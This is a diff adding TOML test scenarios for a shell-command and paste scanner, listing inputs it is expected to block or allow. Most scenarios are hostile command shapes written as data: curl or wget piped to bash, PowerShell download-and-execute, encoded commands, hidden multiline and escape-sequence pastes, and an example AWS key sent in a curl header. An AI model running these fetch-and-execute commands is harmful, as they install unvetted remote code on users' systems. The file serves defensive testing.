@@ -117,3 +117,176 @@ input = "curl -o installer.sh https://example-cli.com/install.sh"
 context = "exec"
 expected_action = "allow"
 tags = ["posix", "allow"]
+
+# ── POSIX pipe-to-shell variations ─────────────────────────────────────────
+# Each scenario exercises a slightly different shape of the same attack
+# class. The block verdict is driven by the curl|bash / wget|sh /
+# pipe_to_interpreter rule on the second pipeline segment — the
+# `.dev` lookalike_tld warn is absorbed by the higher-severity block.
+
+[[scenario]]
+name = "curl_pipe_sudo_bash_https"
+description = "HTTPS curl piped to sudo bash — privilege escalation install pattern"
+input = "curl https://example-cli.dev/install.sh | sudo bash"
+context = "exec"
+expected_action = "block"
+tags = ["posix", "pipe-to-shell"]
+
+[[scenario]]
+name = "wget_pipe_sh"
+description = "wget -O- piped to bare sh — same install shape with a different fetcher"
+input = "wget -O- https://example-cli.dev/script.sh | sh"
+context = "exec"
+expected_action = "block"
+tags = ["posix", "pipe-to-shell"]
+
+[[scenario]]
+name = "env_prefixed_curl_pipe_bash"
+description = "env-prefixed curl piped to bash — env var injection plus install"
+input = "env DEBUG=1 curl https://example-cli.dev/setup.sh | bash"
+context = "exec"
+expected_action = "block"
+tags = ["posix", "pipe-to-shell"]
+
+[[scenario]]
+name = "nohup_prefixed_curl_pipe_bash"
+description = "nohup-prefixed curl piped to bash and backgrounded — survives session disconnect"
+input = "nohup curl https://example-cli.dev/install.sh | bash &"
+context = "exec"
+expected_action = "block"
+tags = ["posix", "pipe-to-shell"]
+
+# ── Terminal-injection paste variations ────────────────────────────────────
+# Each scenario's `input` field is a plain-text approximation; the actual
+# bytes that drive the byte-scan rules live in `raw_bytes` so the attack
+# payload survives TOML escaping intact.
+
+[[scenario]]
+name = "terminal_zero_width_paste"
+description = "Zero-width space hides character boundaries — visible word may differ from typed bytes"
+input = "normal text"
+context = "paste"
+expected_action = "block"
+tags = ["terminal-injection", "zero-width"]
+# Bytes: "norm" + U+200B (E2 80 8B) + "al text"
+raw_bytes = [110, 111, 114, 109, 226, 128, 139, 97, 108, 32, 116, 101, 120, 116]
+
+[[scenario]]
+name = "terminal_ansi_escape_paste"
+description = "ANSI CSI escape sequence pasted into terminal — can rewrite display state"
+input = "[31mred text[0m"
+context = "paste"
+expected_action = "block"
+tags = ["terminal-injection", "ansi-escape"]
+# Bytes: ESC + "[31mred text" + ESC + "[0m"
+raw_bytes = [27, 91, 51, 49, 109, 114, 101, 100, 32, 116, 101, 120, 116, 27, 91, 48, 109]
+
+[[scenario]]
+name = "terminal_hidden_multiline_paste"
+description = "Pasted text has an invisible second line that runs after Enter"
+# Visible first line is benign; the CRLF + second line carries a curl|bash
+# payload. `check_hidden_multiline` flags the second line as a suspicious
+# command shape.
+input = "ls -la\ncurl https://example-cli.dev/install.sh | bash"
+context = "paste"
+expected_action = "block"
+tags = ["terminal-injection", "hidden-multiline"]
+# Bytes: "ls -la" + CRLF + "curl https://example-cli.dev/install.sh | bash"
+raw_bytes = [108, 115, 32, 45, 108, 97, 13, 10, 99, 117, 114, 108, 32, 104, 116, 116, 112, 115, 58, 47, 47, 101, 120, 97, 109, 112, 108, 101, 45, 99, 108, 105, 46, 100, 101, 118, 47, 105, 110, 115, 116, 97, 108, 108, 46, 115, 104, 32, 124, 32, 98, 97, 115, 104]
+
+# ── Hostname attacks ───────────────────────────────────────────────────────
+
+[[scenario]]
+name = "shortened_url_curl_pipe_bash"
+description = "Short fictional domain piped to bash — the pipe-to-shell rule fires regardless of hostname"
+input = "curl https://exa.mp/x | bash"
+context = "exec"
+expected_action = "block"
+tags = ["hostname", "pipe-to-shell"]
+
+[[scenario]]
+name = "plain_http_to_ip_pipe_bash"
+description = "Plain-HTTP raw-IP private-network address piped to bash — multiple high-risk signals"
+input = "curl http://192.168.1.100/install.sh | bash"
+context = "exec"
+expected_action = "block"
+tags = ["hostname", "raw-ip"]
+
+[[scenario]]
+name = "non_standard_port_https"
+description = "Non-standard HTTPS port piped to bash — install from a service on a high port"
+input = "curl https://example-cli.dev:8080/install.sh | bash"
+context = "exec"
+expected_action = "block"
+tags = ["hostname", "non-standard-port"]
+
+# ── Credential exposure ────────────────────────────────────────────────────
+# AWS access keys use a fast regex-based credential rule; the high-entropy
+# bearer/JWT path goes through a recursive entropy scorer that's pathological
+# on long inputs in debug builds, so we keep credential scenarios to the
+# AWS-key form (regex-driven, no entropy recursion).
+
+[[scenario]]
+name = "aws_access_key_in_paste"
+description = "AWS access key ID pasted as an `export` statement — secret leakage into shell history"
+input = "export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE"
+context = "paste"
+expected_action = "block"
+tags = ["credentials", "aws"]
+
+[[scenario]]
+name = "aws_access_key_in_curl_header"
+description = "AWS access key smuggled inside a curl Authorization header — credential exfil shape"
+input = "curl -H 'Authorization: AKIAIOSFODNN7EXAMPLE' https://api.example.com"
+context = "exec"
+expected_action = "block"
+tags = ["credentials", "aws"]
+
+# ── PowerShell variations ──────────────────────────────────────────────────
+
+[[scenario]]
+name = "ps_base64_encoded_command"
+description = "PowerShell -EncodedCommand base64 payload — obfuscated execution"
+input = "powershell -EncodedCommand SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAaQB3AHIAIA=="
+context = "exec"
+shell = "powershell"
+expected_action = "block"
+tags = ["powershell", "base64"]
+
+[[scenario]]
+name = "ps_invoke_expression_full_name"
+description = "Invoke-Expression with a fetched-content argument — inline download-execute, full cmdlet name"
+input = "Invoke-Expression (Invoke-WebRequest -Uri https://example-cli.dev/x.ps1).Content"
+context = "exec"
+shell = "powershell"
+expected_action = "block"
+tags = ["powershell", "download-execute"]
+
+[[scenario]]
+name = "ps_pipe_to_pwsh"
+description = "iwr piped to pwsh -, the modern PowerShell Core interpreter on the pipeline RHS"
+input = "iwr https://example-cli.dev/install.ps1 | pwsh -"
+context = "exec"
+shell = "powershell"
+expected_action = "block"
+tags = ["powershell", "pipe-to-shell"]
+
+# ── Allow / benign ─────────────────────────────────────────────────────────
+
+[[scenario]]
+name = "git_clone_plain_https"
+description = "Plain `git clone` over HTTPS — no pipe-to-shell, no script execution"
+# `.com` rather than `.dev` so the lookalike_tld warn doesn't escalate
+# the verdict above allow. Same reasoning as curl_https_plain_install_allow.
+input = "git clone https://example-cli.com/myrepo.git"
+context = "exec"
+expected_action = "allow"
+tags = ["posix", "allow"]
+
+[[scenario]]
+name = "npm_install_known_clean_package"
+description = "Plain `npm install --save lodash` — no install scripts surfaced, no pipe-to-shell"
+input = "npm install --save lodash"
+context = "exec"
+expected_action = "allow"
+tags = ["posix", "allow"]
